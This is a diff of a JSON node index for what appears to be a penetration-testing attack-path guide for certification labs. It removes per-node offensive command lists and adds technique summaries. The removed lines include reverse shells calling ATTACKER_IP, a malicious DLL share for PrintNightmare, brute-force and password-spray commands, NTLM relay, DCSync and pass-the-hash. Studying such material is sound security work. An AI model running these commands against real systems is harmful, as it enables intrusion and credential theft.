@@ -7,16 +7,10 @@
       "windows",
       "linux"
     ],
-    "tools": [
-      "nmap -sn 192.168.1.0/24",
-      "fping -ag 192.168.1.0/24 2>/dev/null",
-      "arp-scan --localnet",
-      "netdiscover -r 192.168.1.0/24"
-    ],
     "leads_to": [
       "nmap-scan"
     ],
-    "summary": "",
+    "summary": "Enumerate live hosts on a network segment — run this when you land on a pivot host and discover a new subnet.",
     "references": [],
     "filePath": "nodes/01-recon/host-discovery.md"
   },
@@ -27,12 +21,6 @@
     "tags": [
       "windows",
       "linux"
-    ],
-    "tools": [
-      "rustscan -a $TARGET --ulimit 5000 -b 500 -- -Pn 2>/dev/null | tee recon/rustscan.out",
-      "PORTS=$(grep -oP '\\d+(?=/tcp)' recon/rustscan.out | tr '\\n' ',' | sed 's/,$//'); sudo nmap -Pn -sC -sV -p $PORTS -oN recon/tcp.out $TARGET",
-      "sudo nmap -Pn -sU --top-ports 20 -oN recon/udp.out $TARGET &",
-      "sudo nmap -Pn -sC -sV -p- --open -oN recon/tcp.out $TARGET"
     ],
     "leads_to": [
       "smb-enum",
@@ -54,7 +42,7 @@
       "rsync-enum",
       "vnc-enum"
     ],
-    "summary": "",
+    "summary": "Fast port discovery followed by targeted service scanning — the first thing you run on every target.",
     "references": [],
     "filePath": "nodes/01-recon/nmap-scan.md"
   },
@@ -65,17 +53,11 @@
     "tags": [
       "web"
     ],
-    "tools": [
-      "theHarvester -d $DOMAIN -b all",
-      "whois $DOMAIN",
-      "subfinder -d $DOMAIN",
-      "amass enum -passive -d $DOMAIN"
-    ],
     "leads_to": [
       "dns-enum",
       "web-enum"
     ],
-    "summary": "",
+    "summary": "Gather target intelligence without touching the target — subdomains, emails, ASN ranges, and breach data.",
     "references": [],
     "filePath": "nodes/01-recon/passive-recon.md"
   },
@@ -89,17 +71,11 @@
       "web",
       "dns"
     ],
-    "tools": [
-      "dig axfr @$TARGET $DOMAIN",
-      "dnsrecon -d $DOMAIN -t axfr",
-      "gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
-      "dnsrecon -d $DOMAIN -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt"
-    ],
     "leads_to": [
       "web-enum",
       "nmap-scan"
     ],
-    "summary": "",
+    "summary": "Extract subdomains and internal hostnames via zone transfer and brute force — expands the attack surface significantly.",
     "references": [],
     "filePath": "nodes/02-enum/dns-enum.md"
   },
@@ -112,17 +88,11 @@
       "linux",
       "ftp"
     ],
-    "tools": [
-      "nmap -Pn -sV -p 21 --script=\"ftp*\" $TARGET",
-      "ftp $TARGET",
-      "wget -r --no-passive ftp://anonymous:@$TARGET/",
-      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET"
-    ],
     "leads_to": [
       "public-exploit",
       "file-upload-shell"
     ],
-    "summary": "",
+    "summary": "Check for anonymous access, enumerate files, and identify version-specific exploits on FTP services.",
     "references": [],
     "filePath": "nodes/02-enum/ftp-enum.md"
   },
@@ -134,17 +104,11 @@
       "linux",
       "windows"
     ],
-    "tools": [
-      "nmap -sU -p623 --script ipmi-version,ipmi-brute $TARGET",
-      "msfconsole → use auxiliary/scanner/ipmi/ipmi_dumphashes",
-      "ipmitool -I lanplus -H $TARGET -U admin -P admin chassis status",
-      "hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt"
-    ],
     "leads_to": [
       "password-spray",
       "ssh-access"
     ],
-    "summary": "Exploit IPMI 2.0 to dump password hashes or bypass authentication via Cipher 0.",
+    "summary": "Exploit IPMI 2.0 to dump password hashes via RAKP authentication or bypass auth entirely with Cipher 0 — cracked hashes are frequently reused for SSH and web admin panels.",
     "references": [],
     "filePath": "nodes/02-enum/ipmi-enum.md"
   },
@@ -157,18 +121,13 @@
       "ad",
       "kerberos"
     ],
-    "tools": [
-      "kerbrute userenum -d domain.local --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
-      "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt $DC",
-      "impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip $DC"
-    ],
     "leads_to": [
       "asreproast",
       "kerberoast",
       "password-spray",
       "ldap-enum"
     ],
-    "summary": "Enumerate valid domain users via Kerberos pre-authentication error differences — no credentials needed.",
+    "summary": "Confirm valid domain usernames using KDC error code differences — no credentials required, and valid users can be immediately tested for AS-REP roastability.",
     "references": [],
     "filePath": "nodes/02-enum/kerberos-enum.md"
   },
@@ -181,18 +140,12 @@
       "ad",
       "ldap"
     ],
-    "tools": [
-      "ldapsearch -H ldap://$TARGET -x -b \"\" -s base namingContexts",
-      "ldapsearch -H ldap://$TARGET -x -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\" | grep -iE \"sAMAccountName|description|mail|memberOf",
-      "ldapdomaindump -u '' $TARGET",
-      "nxc ldap $TARGET -u '' -p '"
-    ],
     "leads_to": [
       "asreproast",
       "kerberoast",
       "password-spray"
     ],
-    "summary": "",
+    "summary": "Extract the full AD object tree — users, groups, descriptions, and pre-auth flags — often without credentials.",
     "references": [],
     "filePath": "nodes/02-enum/ldap-enum.md"
   },
@@ -204,17 +157,12 @@
       "windows",
       "mssql"
     ],
-    "tools": [
-      "nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET",
-      "mssqlclient.py -db msdb 'DOMAIN/user:password@$TARGET",
-      "mssqlclient.py -db msdb -windows-auth 'DOMAIN/user:password@$TARGET"
-    ],
     "leads_to": [
       "public-exploit",
       "sqli-rce",
       "rev-shell"
     ],
-    "summary": "",
+    "summary": "Connect to MSSQL, escalate to sysadmin via impersonation, and execute OS commands — SQL Server service accounts almost always have SeImpersonatePrivilege.",
     "references": [],
     "filePath": "nodes/02-enum/mssql-enum.md"
   },
@@ -227,15 +175,11 @@
       "linux",
       "mysql"
     ],
-    "tools": [
-      "mysql -h $TARGET -u root",
-      "mysql -h $TARGET -u root -p'"
-    ],
     "leads_to": [
       "sqli-rce",
       "rev-shell"
     ],
-    "summary": "",
+    "summary": "Connect to MySQL, read sensitive files, and write web shells — root with no password is common in lab environments.",
     "references": [],
     "filePath": "nodes/02-enum/mysql-enum.md"
   },
@@ -247,16 +191,11 @@
       "linux",
       "nfs"
     ],
-    "tools": [
-      "showmount -e $TARGET",
-      "sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs",
-      "cat /etc/exports | grep no_root_squash"
-    ],
     "leads_to": [
       "ssh-access",
       "linux-suid-caps"
     ],
-    "summary": "",
+    "summary": "List and mount NFS exports — no_root_squash and UID spoofing are both direct paths to reading restricted files or planting SUID binaries.",
     "references": [],
     "filePath": "nodes/02-enum/nfs-enum.md"
   },
@@ -268,17 +207,12 @@
       "windows",
       "linux"
     ],
-    "tools": [
-      "psql -h $TARGET -U postgres",
-      "nmap -p5432 --script pgsql-brute $TARGET",
-      "hydra -L users.txt -P passwords.txt postgres://$TARGET"
-    ],
     "leads_to": [
       "sqli-rce",
       "rev-shell",
       "public-exploit"
     ],
-    "summary": "Enumerate PostgreSQL databases and escalate to OS command execution via COPY TO PROGRAM.",
+    "summary": "Connect to PostgreSQL and escalate to OS command execution via COPY TO PROGRAM — superuser access (common on default installs) is all it takes.",
     "references": [],
     "filePath": "nodes/02-enum/postgresql-enum.md"
   },
@@ -290,17 +224,12 @@
       "windows",
       "rdp"
     ],
-    "tools": [
-      "nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET",
-      "nxc rdp $TARGET",
-      "hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4"
-    ],
     "leads_to": [
       "rdp-access",
       "password-spray",
       "public-exploit"
     ],
-    "summary": "Check NLA status, enumerate RDP encryption level, and test for known vulnerabilities.",
+    "summary": "Check NLA status, encryption level, and vulnerability to BlueKeep/DejaBlue — NLA disabled means password brute-force is viable.",
     "references": [],
     "filePath": "nodes/02-enum/rdp-enum.md"
   },
@@ -312,16 +241,11 @@
       "linux",
       "redis"
     ],
-    "tools": [
-      "redis-cli -h $TARGET ping",
-      "redis-cli -h $TARGET info",
-      "redis-cli -h $TARGET config get dir"
-    ],
     "leads_to": [
       "rev-shell",
       "ssh-access"
     ],
-    "summary": "",
+    "summary": "Unauthenticated Redis running as root can have an SSH key written directly into authorized_keys — instant foothold.",
     "references": [],
     "filePath": "nodes/02-enum/redis-enum.md"
   },
@@ -332,16 +256,11 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "rsync --list-only rsync://$TARGET/",
-      "rsync -av rsync://$TARGET/<module>/ ./loot/",
-      "nmap -p873 --script rsync-list-modules $TARGET"
-    ],
     "leads_to": [
       "ssh-access",
       "rev-shell"
     ],
-    "summary": "List and download Rsync modules for unauthenticated file access — SSH keys and configs are prime targets.",
+    "summary": "List and download Rsync modules without authentication — home directories exposed here mean SSH key injection is minutes away.",
     "references": [],
     "filePath": "nodes/02-enum/rsync-enum.md"
   },
@@ -353,21 +272,13 @@
       "windows",
       "smb"
     ],
-    "tools": [
-      "nxc smb $TARGET -u '' -p '",
-      "enum4linux-ng $TARGET",
-      "smbclient -L //$TARGET/ -U '' -N",
-      "smbmap -H $TARGET -u '' -p '",
-      "rpcclient -U \"\" -N $TARGET -c \"enumdomusers;enumdomgroups;netshareenum",
-      "nmap -Pn -p 445 --script smb-vuln* $TARGET"
-    ],
     "leads_to": [
       "null-session",
       "password-spray",
       "public-exploit",
       "printnightmare"
     ],
-    "summary": "",
+    "summary": "Enumerate shares, users, and vulnerabilities over SMB — the most common Windows foothold service.",
     "references": [],
     "filePath": "nodes/02-enum/smb-enum.md"
   },
@@ -380,15 +291,10 @@
       "linux",
       "smtp"
     ],
-    "tools": [
-      "smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET",
-      "nmap -Pn -p 25 --script smtp-enum-users,smtp-commands $TARGET",
-      "swaks --to test@$DOMAIN --from att@att.com --server $TARGET"
-    ],
     "leads_to": [
       "password-spray"
     ],
-    "summary": "",
+    "summary": "Enumerate valid usernames via VRFY/RCPT commands and check for open relay misconfigurations.",
     "references": [],
     "filePath": "nodes/02-enum/smtp-enum.md"
   },
@@ -401,15 +307,10 @@
       "linux",
       "snmp"
     ],
-    "tools": [
-      "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET",
-      "snmpwalk -c public -v2c $TARGET",
-      "snmp-check $TARGET -c public"
-    ],
     "leads_to": [
       "password-spray"
     ],
-    "summary": "",
+    "summary": "Read running processes, users, installed software, and open ports from SNMP — often unauthenticated with default community string 'public'.",
     "references": [],
     "filePath": "nodes/02-enum/snmp-enum.md"
   },
@@ -422,18 +323,12 @@
       "linux",
       "ssh"
     ],
-    "tools": [
-      "nmap -p22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $TARGET",
-      "nc -nv $TARGET 22",
-      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4",
-      "nxc ssh $CIDR -u user -p password --continue-on-success"
-    ],
     "leads_to": [
       "ssh-access",
       "password-spray",
       "public-exploit"
     ],
-    "summary": "Banner grab, enumerate auth methods, and brute-force credentials on SSH.",
+    "summary": "Banner grab for version-based exploits, check auth methods to know if password brute-force is viable, and test default credentials before running full wordlists.",
     "references": [],
     "filePath": "nodes/02-enum/ssh-enum.md"
   },
@@ -445,16 +340,11 @@
       "windows",
       "linux"
     ],
-    "tools": [
-      "nmap -p5900-5910 --script vnc-info,vnc-brute $TARGET",
-      "hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET",
-      "vncviewer $TARGET:5900"
-    ],
     "leads_to": [
       "rev-shell",
       "rdp-access"
     ],
-    "summary": "Check VNC for unauthenticated access, null authentication, or weak single-password credentials.",
+    "summary": "Check for null authentication or weak single-password VNC access — GUI access gives clipboard, file transfer, and full desktop without a traditional shell.",
     "references": [],
     "filePath": "nodes/02-enum/vnc-enum.md"
   },
@@ -465,12 +355,6 @@
     "tags": [
       "web"
     ],
-    "tools": [
-      "whatweb -a 3 http://$TARGET && curl -sI http://$TARGET | grep -iE \"server|x-powered|content-type",
-      "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,conf -t 40 --auto-tune -o recon/ferox.out",
-      "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$TARGET -H \"Host: FUZZ.$DOMAIN\" -fw 0",
-      "gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 40"
-    ],
     "leads_to": [
       "sqli-rce",
       "lfi-rce",
@@ -478,7 +362,7 @@
       "ssti-rce",
       "public-exploit"
     ],
-    "summary": "",
+    "summary": "Identify web stack, discover hidden paths, and find attack surface before touching any functionality.",
     "references": [],
     "filePath": "nodes/02-enum/web-enum.md"
   },
@@ -490,17 +374,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt",
-      "impacket-GetNPUsers $DOMAIN/user:password -dc-ip $DC_IP -request -format hashcat -outputfile asrep.txt",
-      "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
-    ],
     "leads_to": [
       "winrm",
       "rev-shell",
       "rdp-access"
     ],
-    "summary": "",
+    "summary": "Request AS-REP hashes for accounts that don't require Kerberos pre-authentication — no credentials needed, just a username list.",
     "references": [],
     "filePath": "nodes/03-initial-access/asreproast.md"
   },
@@ -513,14 +392,11 @@
       "linux",
       "web"
     ],
-    "tools": [
-      "curl -F 'file=@shell.php;type=image/jpeg' http://$TARGET/upload"
-    ],
     "leads_to": [
       "web-shell",
       "rev-shell"
     ],
-    "summary": "",
+    "summary": "Bypass file upload restrictions to plant a web shell — extension filters, content-type checks, and magic bytes are the three layers to defeat.",
     "references": [],
     "filePath": "nodes/03-initial-access/file-upload-shell.md"
   },
@@ -532,16 +408,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt",
-      "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
-    ],
     "leads_to": [
       "winrm",
       "rev-shell",
       "rdp-access"
     ],
-    "summary": "",
+    "summary": "Request TGS tickets for service accounts with SPNs and crack them offline — service accounts often have weak passwords set years ago and never rotated.",
     "references": [],
     "filePath": "nodes/03-initial-access/kerberoast.md"
   },
@@ -553,13 +425,10 @@
       "linux",
       "web"
     ],
-    "tools": [
-      "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u \"http://$TARGET/page.php?FUZZ=../../../../etc/passwd\" -fs 0"
-    ],
     "leads_to": [
       "rev-shell"
     ],
-    "summary": "",
+    "summary": "Read arbitrary files through a vulnerable include parameter — then escalate to RCE by poisoning log files or abusing PHP wrappers.",
     "references": [],
     "filePath": "nodes/03-initial-access/lfi-rce.md"
   },
@@ -572,17 +441,12 @@
       "ad",
       "smb"
     ],
-    "tools": [
-      "impacket-ntlmrelayx -tf targets.txt -smb2support",
-      "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
-      "impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
-    ],
     "leads_to": [
       "rev-shell",
       "pass-the-hash",
       "domain-admin"
     ],
-    "summary": "",
+    "summary": "Intercept and relay NTLM authentication to a target you control — SMB signing disabled is the prerequisite, and relaying to ADCS can yield a domain admin certificate.",
     "references": [],
     "filePath": "nodes/03-initial-access/ntlm-relay.md"
   },
@@ -594,17 +458,12 @@
       "windows",
       "smb"
     ],
-    "tools": [
-      "smbclient //$TARGET/ShareName -U '' -N",
-      "rpcclient -U \"\" -N $TARGET -c \"enumdomusers",
-      "nxc smb $TARGET -u '' -p '' --shares"
-    ],
     "leads_to": [
       "rev-shell",
       "password-spray",
       "windows-gpp-creds"
     ],
-    "summary": "",
+    "summary": "Access SMB shares and RPC endpoints without any credentials — leaks users, groups, password policies, and SYSVOL contents.",
     "references": [],
     "filePath": "nodes/03-initial-access/null-session.md"
   },
@@ -618,12 +477,6 @@
       "ad",
       "smb"
     ],
-    "tools": [
-      "nxc smb $DC_IP -u '' -p '' --pass-pol",
-      "kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123",
-      "nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success",
-      "nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
-    ],
     "leads_to": [
       "winrm",
       "rev-shell",
@@ -631,7 +484,7 @@
       "ssh-access",
       "bloodhound"
     ],
-    "summary": "",
+    "summary": "Test one password against all known users — the safest way to turn a username list into a credential without triggering lockouts.",
     "references": [],
     "filePath": "nodes/03-initial-access/password-spray.md"
   },
@@ -642,16 +495,11 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "impacket-rpcdump @$TARGET | grep -i print",
-      "python3 CVE-2021-1675.py domain/user:pass@$TARGET '\\\\ATTACKER\\share\\evil.dll",
-      "msfconsole → use exploit/windows/dcerpc/cve_2021_1675_printnightmare"
-    ],
     "leads_to": [
       "rev-shell",
       "system-shell"
     ],
-    "summary": "Exploit Windows Print Spooler RCE to load a malicious DLL as SYSTEM — works on unpatched DCs and workstations.",
+    "summary": "Exploit Windows Print Spooler RCE to load a malicious DLL as SYSTEM — works on unpatched DCs and workstations with valid credentials.",
     "references": [],
     "filePath": "nodes/03-initial-access/printnightmare.md"
   },
@@ -665,15 +513,11 @@
       "web",
       "smb"
     ],
-    "tools": [
-      "searchsploit \"$SERVICE $VERSION",
-      "nmap -Pn -p $PORT --script vuln $TARGET"
-    ],
     "leads_to": [
       "rev-shell",
       "system-shell"
     ],
-    "summary": "",
+    "summary": "Match service version banners against known CVEs — many OSCP/CPTS targets are intentionally running unpatched software with public PoCs.",
     "references": [],
     "filePath": "nodes/03-initial-access/public-exploit.md"
   },
@@ -686,16 +530,11 @@
       "ad",
       "smb"
     ],
-    "tools": [
-      "nxc smb 192.168.x.0/24 --gen-relay-list targets.txt",
-      "sudo responder -I tun0 -dwv",
-      "hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt"
-    ],
     "leads_to": [
       "ntlm-relay",
       "password-spray"
     ],
-    "summary": "",
+    "summary": "Poison LLMNR/NBT-NS queries to capture NTLMv2 hashes or relay them to unsigned SMB targets — run immediately on joining any Windows network.",
     "references": [],
     "filePath": "nodes/03-initial-access/responder.md"
   },
@@ -706,16 +545,11 @@
     "tags": [
       "web"
     ],
-    "tools": [
-      "sqlmap -r request.txt --batch --dbs",
-      "sqlmap -r request.txt --batch --os-shell",
-      "sqlmap -r request.txt --dbms=mssql --batch --level=5 --risk=3"
-    ],
     "leads_to": [
       "rev-shell",
       "web-shell"
     ],
-    "summary": "",
+    "summary": "Exploit SQL injection to read credentials, write web shells, or execute OS commands — the path from SQLi to shell depends on the database engine.",
     "references": [],
     "filePath": "nodes/03-initial-access/sqli-rce.md"
   },
@@ -726,13 +560,10 @@
     "tags": [
       "web"
     ],
-    "tools": [
-      "tplmap -u 'http://$TARGET/page?name=INJECT' --os-shell"
-    ],
     "leads_to": [
       "rev-shell"
     ],
-    "summary": "",
+    "summary": "Inject template syntax into user-controlled fields to break out of the template context and execute arbitrary OS commands.",
     "references": [],
     "filePath": "nodes/03-initial-access/ssti-rce.md"
   },
@@ -744,18 +575,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "evil-winrm -i $TARGET -u Administrator -H NTLM_HASH",
-      "impacket-psexec Administrator@$TARGET -hashes :NTLM_HASH",
-      "impacket-wmiexec Administrator@$TARGET -hashes :NTLM_HASH",
-      "nxc smb 192.168.x.0/24 -u Administrator -H NTLM_HASH --local-auth"
-    ],
     "leads_to": [
       "token-impersonation",
       "bloodhound",
       "dcsync"
     ],
-    "summary": "",
+    "summary": "Authenticate with an NTLM hash or Kerberos ticket instead of a plaintext password — every hash you dump should be sprayed across the subnet immediately.",
     "references": [],
     "filePath": "nodes/04-foothold/pass-the-hash.md"
   },
@@ -767,11 +592,6 @@
       "windows",
       "rdp"
     ],
-    "tools": [
-      "xfreerdp /u:user /p:password /v:$TARGET",
-      "xfreerdp /u:Administrator /pth:NTLM_HASH /v:$TARGET",
-      "nmap -Pn -p 3389 --script rdp-enum-encryption $TARGET"
-    ],
     "leads_to": [
       "token-impersonation",
       "windows-stored-creds",
@@ -780,7 +600,7 @@
       "windows-gpp-creds",
       "bloodhound"
     ],
-    "summary": "",
+    "summary": "Connect to Windows via RDP for a full GUI session — supports pass-the-hash and is the best interface for interactive tools like BloodHound and browser-based admin panels.",
     "references": [],
     "filePath": "nodes/04-foothold/rdp-access.md"
   },
@@ -791,12 +611,6 @@
     "tags": [
       "windows",
       "linux"
-    ],
-    "tools": [
-      "rlwrap nc -nvlp 4444",
-      "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'",
-      "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])'",
-      "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f"
     ],
     "leads_to": [
       "linux-sudo",
@@ -815,7 +629,7 @@
       "linux-shared-lib",
       "bloodhound"
     ],
-    "summary": "",
+    "summary": "Convert code execution into an interactive session by connecting the target back to your listener — the universal handoff from exploit to shell.",
     "references": [],
     "filePath": "nodes/04-foothold/rev-shell.md"
   },
@@ -826,11 +640,6 @@
     "tags": [
       "linux",
       "ssh"
-    ],
-    "tools": [
-      "ssh user@$TARGET",
-      "ssh -i id_rsa user@$TARGET",
-      "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4"
     ],
     "leads_to": [
       "linux-sudo",
@@ -843,7 +652,7 @@
       "linux-docker-escape",
       "linux-shared-lib"
     ],
-    "summary": "",
+    "summary": "Authenticate to SSH with a password, private key, or brute-forced credential — the most stable and interactive Linux foothold available.",
     "references": [],
     "filePath": "nodes/04-foothold/ssh-access.md"
   },
@@ -856,16 +665,13 @@
       "linux",
       "web"
     ],
-    "tools": [
-      "curl http://$TARGET/uploads/shell.php?cmd=id"
-    ],
     "leads_to": [
       "linux-suid-caps",
       "linux-sudo",
       "token-impersonation",
       "rev-shell"
     ],
-    "summary": "",
+    "summary": "Plant a minimal script on the server to execute OS commands via HTTP — a stepping stone to a full reverse shell, not a final destination.",
     "references": [],
     "filePath": "nodes/04-foothold/web-shell.md"
   },
@@ -877,11 +683,6 @@
       "windows",
       "ad",
       "winrm"
-    ],
-    "tools": [
-      "evil-winrm -i $IP -u $USER -p $PASS",
-      "evil-winrm -i $IP -u $USER -H $NTLM_HASH",
-      "nxc winrm $IP -u $USER -p $PASS"
     ],
     "leads_to": [
       "token-impersonation",
@@ -895,7 +696,7 @@
       "windows-uac-bypass",
       "bloodhound"
     ],
-    "summary": "",
+    "summary": "Get a PowerShell session over WinRM with evil-winrm — supports password and hash auth, and is the fastest path to an interactive Windows shell without needing a GUI.",
     "references": [],
     "filePath": "nodes/04-foothold/winrm.md"
   },
@@ -907,17 +708,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "bloodyAD -u user -p password -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!",
-      "nxc ldap $DC_IP -u user -p password --gmsa",
-      "impacket-dacledit $DOMAIN/$USER:$PASS -action write -rights DCSync -target-dn \"DC=domain,DC=local\" -principal $USER"
-    ],
     "leads_to": [
       "dcsync",
       "winrm",
       "domain-admin"
     ],
-    "summary": "",
+    "summary": "Exploit Active Directory ACL misconfigurations — GenericAll, WriteDACL, ForceChangePassword, and similar edges identified by BloodHound translate directly into account takeover or DCSync.",
     "references": [],
     "filePath": "nodes/05-privesc/acl-abuse.md"
   },
@@ -929,16 +725,11 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP -vulnerable -stdout",
-      "certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca CA-NAME -template VulnerableTemplate -upn Administrator@$DOMAIN",
-      "certipy auth -pfx administrator.pfx -dc-ip $DC_IP"
-    ],
     "leads_to": [
       "domain-admin",
       "dcsync"
     ],
-    "summary": "",
+    "summary": "Request a certificate as any user (including Administrator) from a template that lets enrollees specify their own Subject Alternative Name — certipy handles the full chain.",
     "references": [],
     "filePath": "nodes/05-privesc/adcs-esc1.md"
   },
@@ -950,17 +741,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "certipy template -u user@$DOMAIN -p password -dc-ip $DC_IP -template TargetTemplate -save-old",
-      "certipy template -u user@$DOMAIN -p password -dc-ip $DC_IP -template TargetTemplate -write-default-configuration",
-      "certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca CA-NAME -template TargetTemplate -upn Administrator@$DOMAIN"
-    ],
     "leads_to": [
       "adcs-esc1",
       "domain-admin",
       "dcsync"
     ],
-    "summary": "",
+    "summary": "Overwrite a certificate template's configuration to make it ESC1-vulnerable, then exploit it as Administrator — requires write access to the template object in AD.",
     "references": [],
     "filePath": "nodes/05-privesc/adcs-esc4.md"
   },
@@ -972,10 +758,6 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All",
-      "SharpHound.exe -c All --zipfilename loot.zip"
-    ],
     "leads_to": [
       "acl-abuse",
       "adcs-esc1",
@@ -985,7 +767,7 @@
       "kerberos-delegation",
       "laps-abuse"
     ],
-    "summary": "",
+    "summary": "Map all attack paths from your current account to Domain Admin — run BloodHound before Kerberoasting, before Certipy, before anything else once you have valid creds.",
     "references": [],
     "filePath": "nodes/05-privesc/bloodhound.md"
   },
@@ -997,16 +779,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "impacket-secretsdump $DOMAIN/user:password@$DC_IP",
-      "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP"
-    ],
     "leads_to": [
       "domain-admin",
       "golden-ticket",
       "silver-ticket"
     ],
-    "summary": "",
+    "summary": "Replicate password hashes from a domain controller using DRSUAPI — requires DCSync rights (DA, DC, or explicit delegation) and gives you every account hash in the domain.",
     "references": [],
     "filePath": "nodes/05-privesc/dcsync.md"
   },
@@ -1019,16 +797,11 @@
       "ad",
       "kerberos"
     ],
-    "tools": [
-      "impacket-findDelegation domain.local/user:pass -dc-ip $DC",
-      "Get-ADComputer -Filter {TrustedForDelegation -eq $true}",
-      "Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/$TARGET"
-    ],
     "leads_to": [
       "domain-admin",
       "system-shell"
     ],
-    "summary": "Abuse Unconstrained, Constrained, or Resource-Based Constrained Delegation to impersonate privileged users and access services.",
+    "summary": "Abuse Unconstrained, Constrained, or Resource-Based Constrained Delegation to impersonate privileged users — BloodHound shows all three types as delegation edges.",
     "references": [],
     "filePath": "nodes/05-privesc/kerberos-delegation.md"
   },
@@ -1040,16 +813,11 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "crackmapexec smb $TARGET -u user -p pass -M laps",
-      "Get-ADComputer $TARGET -Properties ms-Mcs-AdmPwd",
-      "impacket-laps domain.local/user:pass -computer $TARGET -dc-ip $DC"
-    ],
     "leads_to": [
       "system-shell",
       "domain-admin"
     ],
-    "summary": "Read LAPS local admin passwords or gMSA service account passwords from Active Directory if you have the required permissions.",
+    "summary": "Read LAPS local admin passwords or gMSA service account NTLM hashes from AD if your account has ReadProperty access — BloodHound shows both as explicit edges.",
     "references": [],
     "filePath": "nodes/05-privesc/laps-abuse.md"
   },
@@ -1060,17 +828,12 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "find / -name \"*.conf\" 2>/dev/null | xargs grep -li \"password\" 2>/dev/null",
-      "cat ~/.bash_history",
-      "find / -name \"id_rsa\" -o -name \"id_ecdsa\" 2>/dev/null"
-    ],
     "leads_to": [
       "linux-sudo",
       "root-linux",
       "ssh-access"
     ],
-    "summary": "",
+    "summary": "Search config files, shell history, and SSH keys for credentials — database passwords in web configs are frequently reused as system passwords.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-cred-hunting.md"
   },
@@ -1081,14 +844,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "cat /etc/crontab",
-      "/tmp/pspy64"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "",
+    "summary": "Find cron jobs running as root that use writable scripts or call binaries without full paths — any write access to what root runs is a path to root.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-cron.md"
   },
@@ -1099,15 +858,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "find / -name docker.sock 2>/dev/null",
-      "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
-      "capsh --print"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "Escape Docker containers via socket access, privileged mode, or exposed capabilities to gain root on the host.",
+    "summary": "Break out of a Docker container via the socket, privileged mode, or dangerous capabilities — the socket is the most common and gives full daemon control over the host.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-docker-escape.md"
   },
@@ -1118,15 +872,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "uname -a",
-      "searchsploit linux kernel",
-      "/tmp/PwnKit"
-    ],
     "leads_to": [
